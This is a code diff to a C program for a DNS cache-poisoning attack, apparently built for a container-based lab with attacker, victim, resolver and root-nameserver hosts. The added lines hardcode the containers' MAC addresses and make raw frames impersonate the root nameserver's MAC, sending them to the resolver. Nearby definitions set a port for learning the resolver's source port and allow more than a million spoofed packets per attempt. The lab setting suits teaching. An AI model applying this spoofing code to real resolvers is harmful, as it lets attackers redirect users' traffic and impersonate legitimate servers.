@@ -30,10 +30,17 @@
 #define ATTACKER_AUTH_IP   "192.168.1.201"   /* attacker-auth */
 #define ATTACKER_CLIENT_IP "192.168.1.202"   /* this container */
 
+/* MAC addresses for all containers */
+#define RESOLVER_MAC       "\x02\x42\xac\x11\x00\x03"
+#define ROOT_NS_MAC        "\x02\x42\xac\x11\x00\x04"
+#define ATTACKER_AUTH_MAC  "\x02\x42\xac\x11\x00\x01"
+#define ATTACKER_CLIENT_MAC "\x02\x42\xac\x11\x00\x02"
+#define VICTIM_CLIENT_MAC  "\x02\x42\xac\x11\x00\x05"
+
 #define DNS_PORT           53
 #define MAX_SUBDOMAIN_LEN  256
 #define MAX_BYTES_PER_PACKET 2048
-#define TCP_PORT    1234        //todo check port
+#define TCP_PORT    12345       // Port for receiving resolver port from server
 #define MAX_LEN_PORT 64
 // send at most 65536*20 spoofed packets in each attack attempt
 #define MAX_SPOOFED_PKTS   (65536 * 20)
@@ -289,10 +296,13 @@ static int init_raw_socket(void)
            g_src_mac[0], g_src_mac[1], g_src_mac[2],
            g_src_mac[3], g_src_mac[4], g_src_mac[5], ifindex);
     
-    // Set destination MAC (resolver's gateway/router MAC - typically need ARP)
-    // For now, use broadcast or set manually if known
-    // TODO: In production, perform ARP lookup for RESOLVER_IP
-    memset(g_dest_mac, 0xff, 6);  // Broadcast for now
+    // Set source MAC to root NS (for spoofing packets from root server)
+    memcpy(g_src_mac, ROOT_NS_MAC, 6);
+    printf("Spoofing as root NS MAC: 02:42:ac:11:00:04\n");
+    
+    // Set destination MAC to resolver
+    memcpy(g_dest_mac, RESOLVER_MAC, 6);
+    printf("Sending to resolver MAC: 02:42:ac:11:00:03\n");
     
     // Setup sockaddr_ll for sendto
     memset(&g_dest_addr, 0, sizeof(g_dest_addr));
